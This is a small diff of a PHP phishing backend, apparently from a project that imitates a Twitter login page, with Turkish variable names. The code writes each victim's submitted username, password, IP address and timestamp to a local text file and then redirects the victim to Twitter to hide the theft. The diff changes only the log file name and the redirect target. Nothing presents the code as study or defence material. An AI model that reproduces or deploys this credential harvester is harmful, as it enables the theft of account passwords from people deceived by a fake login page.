@@ -7,14 +7,14 @@ $sifre = $_POST['Password'];
 $ip =$_SERVER["REMOTE_ADDR"];
 $tarih = date('d.m.Y - H:i');
 
-$dosya = fopen ("bilgiler.md" , 'a'); 
+$dosya = fopen ("bilgiler.txt" , 'a'); 
 $yaz="Date: ".$tarih."\nUsername:  ". $kullaniciadi . "   Password: " .$sifre."   IP: ".$ip."\n\n";
 fwrite ( $dosya , $yaz ) ;
 fclose ($dosya);
 
 
 
-header("Location: https://twitter.com/i/flow/login"); 
+header("Location: https://twitter.com/"); 
 die();
 
  ?>
